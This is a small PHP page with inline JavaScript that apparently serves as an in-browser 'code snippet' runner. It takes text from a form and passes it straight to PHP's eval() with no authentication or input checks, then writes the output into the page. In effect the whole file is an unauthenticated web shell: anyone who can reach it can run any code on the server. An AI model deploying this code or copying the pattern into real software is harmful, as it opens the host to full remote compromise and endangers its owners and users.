<?php
	if(count($_POST)){
		if($_POST['code']){
			eval($_POST['code']);
		}else{
			echo '<em style="color:#f00">Enter code snipet</em>';
		}
	}else{
?>
<form id="frm-code">
<textarea rows="8" style="width:100%;" name="code" placeholder="Enter snippet..."><?=@$_POST['code']?></textarea>
<br/><button type="submit">Execute</button>
</form>
<hr/>
<div id="result">
</div>
<script>
document.querySelector("#frm-code").addEventListener("submit", function(e){
	e.preventDefault();    //stop form from submitting
	//console.log(document.querySelector("#frm-code"));
	ajaxPost(e.target, function(data){
		document.querySelector("#result").innerHTML = this.responseText;
	});
});
function ajaxPost (form, callback) {
    var url = form.action,
        xhr = new XMLHttpRequest();

    //This is a bit tricky, [].fn.call(form.elements, ...) allows us to call .fn
    //on the form's elements, even though it's not an array. Effectively
    //Filtering all of the fields on the form
    var params = [].filter.call(form.elements, function(el) {
        //Allow only elements that don't have the 'checked' property
        //Or those who have it, and it's checked for them.
        return typeof(el.checked) === 'undefined' || el.checked;
        //Practically, filter out checkboxes/radios which aren't checekd.
    })
    .filter(function(el) { return !!el.name; }) //Nameless elements die.
    .filter(function(el) { return !el.disabled; }) //Disabled elements die.
    .map(function(el) {
        //Map each field into a name=value string, make sure to properly escape!
        return encodeURIComponent(el.name) + '=' + encodeURIComponent(el.value);
    }).join('&'); //Then join all the strings by &
    xhr.open("POST", url);
    // Changed from application/x-form-urlencoded to application/x-form-urlencoded
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    //.bind ensures that this inside of the function is the XHR object.
    xhr.onload = callback.bind(xhr); 

    //All preperations are clear, send the request!
    xhr.send(params);
}
</script>
<?php } ?>